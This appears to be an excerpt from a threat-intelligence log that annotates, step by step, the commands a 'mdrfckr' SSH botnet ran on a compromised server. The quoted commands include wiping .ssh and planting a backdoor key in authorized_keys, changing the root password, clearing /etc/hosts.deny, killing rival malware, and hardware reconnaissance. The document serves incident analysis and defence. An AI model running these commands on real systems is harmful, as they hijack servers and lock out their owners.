...
**00:24:20Z** — `cd ~; chattr -ia .ssh; lockr -ia .ssh`

First action after login — removes immutable attributes from .ssh directory. `chattr -ia` clears append-only and immutable flags; `lockr -ia` is a mdrfckr-specific tool performing equivalent operations. Ensures the backdoor injection cannot be blocked by filesystem protections.

---

**00:24:21Z** — `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa  mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`

Core backdoor installation as a single chained command in under 1 second. Wipes existing .ssh directory, recreates it, injects campaign RSA key, locks permissions. After this command the C2 operator has permanent passwordless SSH access regardless of subsequent password changes.

---

**00:24:38Z** — `cat /proc/cpuinfo | grep name | wc -l`

CPU core count — assesses server processing capacity for cryptomining or DDoS suitability.

---

**00:24:40Z** — `echo "root:bXyDHtBxO88X"|chpasswd|bash`

Rotates root password to randomly-generated string. Each mdrfckr session uses a different generated password — automated credential management from centralized C2. Locks out the legitimate server owner.

---

**00:24:42Z** — `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep`

Anti-competition cleanup — kills rival malware processes and clears /etc/hosts.deny to ensure operator's future connections are not blocked.

---

**00:24:44Z** — `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`

CPU model name extraction — more detailed processor identification for asset inventory.

---

**00:24:47Z** — `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`

RAM usage report — total, used, free, shared, cache, available memory.

---

**00:24:48Z** — `ls -lh $(which ls)`
...
Lists logged-in users and system uptime — detects if legitimate administrator is currently active.
...
**00:24:54Z** — `cat /proc/cpuinfo | grep model | grep name | wc -l`
...
**00:25:02Z** — `lscpu | grep Model`

Detailed CPU model from lscpu — corroborates /proc/cpuinfo data.

---

**00:25:03Z** — `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
...
*(source: ioc_export.py — see /docs/ioc-ips.csv)*
